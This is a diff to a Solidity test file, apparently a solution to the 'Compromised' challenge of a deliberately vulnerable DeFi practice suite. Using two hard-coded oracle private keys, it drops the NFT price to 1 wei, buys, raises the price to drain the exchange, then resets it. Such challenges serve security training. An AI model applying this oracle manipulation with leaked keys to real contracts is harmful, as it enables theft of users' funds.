@@ -76,7 +76,28 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
-
+        address sourceA = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        address sourceB = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+        vm.prank(sourceA);
+        trustfulOracle.postPrice("DVNFT", 1 wei);
+        vm.prank(sourceB);
+        trustfulOracle.postPrice("DVNFT", 1 wei);
+        uint256 price = trustfulOracle.getMedianPrice("DVNFT");
+        console2.log(price);
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: price}();
+        vm.prank(sourceA);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(sourceB);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+        vm.prank(sourceA);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(sourceB);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         /**
          * EXPLOIT END *
          */
